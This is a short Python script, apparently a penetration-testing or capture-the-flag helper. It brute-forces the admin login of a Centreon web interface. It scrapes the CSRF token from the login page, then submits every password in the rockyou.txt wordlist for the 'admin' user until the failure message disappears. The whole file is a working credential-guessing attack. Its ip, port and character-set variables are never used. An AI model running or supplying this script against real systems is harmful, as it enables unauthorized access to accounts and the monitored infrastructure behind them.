#!/usr/bin/python
 

import requests
import sys
import warnings
from bs4 import BeautifulSoup
from itertools import product


# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
 
#if len(sys.argv) != 6:
#    print(len(sys.argv))
#    print("[~] Usage : ./centreon_authent.py url username password ip port")
#    exit()
 
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]
 
chars = 'abcdefghijklmnopqrstuvwxyz0123456789' # chars to look for
chars = 'abcdefghijklmnopqrstuvwxyz' # chars to look for

def try_cred(username, password):
    request = requests.session()
    print("[+] Retrieving CSRF token to submit the login form")
    page = request.get(url+"/index.php")
    html_content = page.text
    soup = BeautifulSoup(html_content)
    token = soup.findAll('input')[3].get("value")
    
    login_info = {
        "useralias": username,
        "password": password,
        "submitLogin": "Connect",
        "centreon_token": token
    }
    login_request = request.post(url+"/index.php", login_info)
    print("[+] Login token is : {0}".format(token))

    if "Your credentials are incorrect." not in login_request.text:
        print("[+] Logged In Sucssfully")
        exit()

    else:
        print("[-] Wrong credentials")

f = open('/usr/share/wordlists/rockyou.txt', 'r')  
for line in f.readlines():  
    pw = line.strip('\n')
    print(pw)
    try_cred('admin', pw)